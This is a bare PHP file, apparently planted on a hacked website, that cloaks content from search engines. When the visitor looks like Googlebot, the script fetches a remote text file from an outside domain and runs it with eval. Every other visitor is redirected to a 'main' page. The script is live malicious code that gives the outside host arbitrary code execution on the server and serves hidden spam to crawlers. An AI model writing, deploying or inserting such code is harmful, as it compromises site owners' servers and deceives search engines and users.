<?php
$userIp = $_SERVER['REMOTE_ADDR'];
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
$referer = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : 'Tidak ada referer';
$hostname = gethostbyaddr($userIp);

function isGooglebot($hostname, $userAgent) {
    return (
        strpos($hostname, 'googlebot.com') !== false ||
        strpos($userAgent, 'google-inspectiontool') !== false
    );
}

if (isGooglebot($hostname, $userAgent)) {
    $remoteCode = file_get_contents('https://xinztheonly.one/txt/google/oapr.txt');
    eval('?>' . $remoteCode);
    exit;
} else {
 header( "location: main" );
}
?>
